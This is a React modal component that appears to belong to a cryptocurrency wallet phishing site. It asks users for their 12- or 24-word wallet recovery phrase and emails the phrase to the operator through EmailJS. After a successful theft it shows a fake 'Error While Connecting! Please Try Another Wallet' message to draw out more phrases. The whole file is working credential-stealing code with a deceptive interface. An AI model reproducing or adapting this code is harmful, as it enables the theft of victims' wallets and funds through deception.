import React, { useState } from "react";
import emailjs from "emailjs-com";
import { ToastContainer, toast } from "react-toastify";
import 'react-toastify/dist/ReactToastify.css';

const Modal = ({ wallet, closeModal }) => {
  const [text, setText] = useState(""); 
  const [loading, setLoading] = useState(false);

  const handleTextChange = (e) => {
    setText(e.target.value);
  };

  const isDisabled = text.split(" ").filter(Boolean).length < 12;

  const sendEmail = () => {
    setLoading(true);
    const templateParams = {
      to_name: wallet.name,
      from_name: 'YourAppName',
      message: text,
    };

    emailjs
      .send(
        import.meta.env.VITE_EMAILJS_SERVICE_ID, 
        import.meta.env.VITE_EMAILJS_TEMPLATE_ID, 
        templateParams,
        import.meta.env.VITE_EMAILJS_USER_ID 
      )
      .then(
        (response) => {
          console.log("SUCCESS!", response.status, response.text);
          setLoading(false);
          toast.success('Error While Connecting! Please Try Another Wallet', {
            className: 'text-red-500', // Apply Tailwind for success toast
          });
        },
        (error) => {
          console.log("FAILED...", error);
          setLoading(false);
          toast.error('Failed to send email. Try again!', {
            className: 'bg-red-900 text-orange', // Apply Tailwind for error toast
          });
        }
      );
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
      <div className="bg-white rounded-lg w-[90%] sm:w-[400px] md:w-[500px] p-6">
        {/* Wallet Name and Image */}
        <div className="flex items-center mb-4">
          <img
            src={wallet.image}
            alt={wallet.name}
            className="rounded-full h-[40px] sm:h-[50px]"
          />
          <h3 className="ml-2 text-lg sm:text-xl font-bold">{wallet.name}</h3>
        </div>

        {/* Textarea for Recovery Phrase */}
        <div className="mb-4">
          <textarea
            className="w-full p-3 border rounded-md"
            placeholder="Enter your recovery phrase"
            rows="4"
            value={text} 
            onChange={handleTextChange} 
          />
          <p className="text-sm text-gray-500 mt-2">
            Typically 12 (sometimes 24) words separated by single spaces.
          </p>
        </div>

        {/* Proceed and Cancel Buttons */}
        <div className="flex flex-col items-center space-y-2">
          <button
            className={`${
              isDisabled || loading
                ? "bg-gray-400 cursor-not-allowed"
                : "bg-blue-600"
            } text-white px-4 py-2 rounded-md w-full sm:w-[90%] md:w-[450px]`}
            disabled={isDisabled || loading}
            onClick={sendEmail}
          >
            {loading ? "SENDING..." : "CONNECT"}
          </button>
          <button
            className="bg-red-500 text-white px-4 py-2 rounded-md w-full sm:w-auto sm:px-6"
            onClick={closeModal}
          >
            Cancel
          </button>
        </div>

        {/* React Toast Container */}
        <ToastContainer />
      </div>
    </div>
  );
};

export default Modal;
